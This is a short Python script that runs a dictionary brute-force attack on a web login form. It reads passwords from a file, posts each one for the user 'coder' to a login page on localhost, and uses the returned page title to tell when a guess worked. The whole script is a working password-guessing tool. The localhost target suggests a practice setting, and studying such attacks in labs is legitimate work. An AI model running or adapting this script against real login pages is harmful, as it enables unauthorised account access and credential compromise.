import requests
from bs4 import BeautifulSoup
import time
url="http://localhost:3000/login"
# print(send_data_url)
file=open('t.txt','r')
for password in file.readlines():
	data = {'uniqe_name':'coder','log_pass':password.strip('\n')}
	send_data_url = requests.post(url, data=data)
	soup=BeautifulSoup(send_data_url.text,'html.parser')
	if(soup.find('title').text=="Profile Of coder"):
		print(password)
		break
	elif(soup.find('title').text=="Log In Page"):
		print("Trying")
